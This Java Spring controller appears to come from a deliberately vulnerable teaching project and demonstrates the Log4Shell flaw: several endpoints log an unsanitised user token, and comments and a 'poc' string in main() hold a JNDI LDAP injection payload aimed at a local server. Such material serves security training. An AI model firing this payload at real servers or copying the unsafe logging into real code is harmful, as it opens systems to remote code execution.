package org.joychou.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class Log4j {

    private static final Logger logger = LogManager.getLogger("Log4j");

    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     */
    @RequestMapping(value = "/log4j")
    public String log4j(String token) {
        String privateKey = "parivate";
        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
        return token;
    }

    public static void main(String[] args) {
        String poc = "${jndi:ldap://127.0.0.1:1389/0iun75}";
        logger.info(poc);
        String token = "token";
        String privateKey = "parivate";
        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
    }

    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     */
    @RequestMapping(value = "/log4j1")
    public String log4j1(String token) {
        String privateKey = "parivate";
        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
        return token;
    }


    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     */
    @RequestMapping(value = "/log4j2")
    public String log4j2(String token) {
        String privateKey = "parivate";
        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
        return token;
    }

    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     */
    @RequestMapping(value = "/log4j3")
    public String log4j3(String token) {
        String privateKey = "parivate";
        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
        return token;
    }

    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     */
    @RequestMapping(value = "/log4j4")
    public String log4j4(String token) {
        String param = "param";
        logger.error("something wrong, token: {}, param: {}", token, param);
        return token;
    }
}
